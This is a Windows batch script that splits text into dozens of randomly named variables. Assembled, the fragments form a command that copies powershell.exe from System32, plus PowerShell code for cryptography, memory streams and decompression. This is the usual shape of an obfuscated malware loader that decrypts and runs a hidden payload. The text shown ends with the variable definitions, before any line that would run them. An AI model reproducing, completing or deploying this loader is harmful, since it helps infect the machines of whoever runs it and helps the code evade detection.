@echo off
set "WlKQPhKZhU=nd"
set "lmncxvpiki=po"
set "ovOfYAaGFq=rs"
set "gGTZcQSfGU= C"
set "xAkPJVvNiF=em"
set "vgPySiLhzc=in"
set "OFjaaYszCl=ll"
set "ODZjKbqNOc=co"
set "KBNCVzIgcW=ll"
set "SqlorZxZIF=\v"
set "uJCTTAtoQV=xe"
set "MBwBiYMrOv=he"
set "zPktTadgjY=:\"
set "rVdZeLbAhp=\W"
set "GTwGkEMQop=rS"
set "LIYRlnnYWo=32"
set "pdZpOsPqnC=st"
set "eRtYkCwkKX=ws"
set "CWkQYMhVjy=Wi"
set "BNJjCLuAJZ=we"
set "mrqEIaKwGm=0\"
set "myaEuSiaUk=py"
set "WloOpMImkz= /"
set "IWWiXoftDL=Sy"
set "GkMGYQxhdW=.e"
set "STEIKfoMxC=y "
set "PbQWHkwcaq=s\"
set "pbtvtGOilV=he"
set "TUFTjFTzYd=Po"
set "SclJqaJXLw=1."
set "BgyTvZJfZw=we"
set "jkgTDwoHLt=ow"
set "TslYaHfidB=do"
set "DdtKpWLdyt=cd"
set "IhkGYGkUEV= %~dp0"
set "iyJsOwwLdT=Star"
set "VwtXuqtUSW=lo.I"
set "fTJunGrTve=ress"
set "vvkJoLICHl=)))"
set "evIoAJrwiM=();$"
set "egGXLpbaTC=and "
set "jvFwFbudJY=:('g"
set "psYvChUkqv=TllA"
set "oFYtcxEoPt=:: '"
set "PfktDpOcMg=em.I"
set "BUpRbDeDgV=UyVU"
set "hZllALyGnc=ypto"
set "WCLlvxpeZk=ateD"
set "ekiRbiJCzW=]::("
set "nCgJUpEVNh=aDNK"
set "XuZnmMJZbh=]::C"
set "QKYrnGGAzr=mory"
set "aSOTURXyXF=pher"
set "PEqaDfcUdq=Stre"
set "nQrtZMJrSb=join"
set "DycskJfmqG=qH, "
set "YZGvAhnXhf=oryS"
set "RsNPrUjBRC=fore"
set "iftcClbnnG=DNJS"
set "CvfLLoQhBS=-joi"
set "KXIjCPCuxw=ispo"
set "fJowNAgpqf=d = "
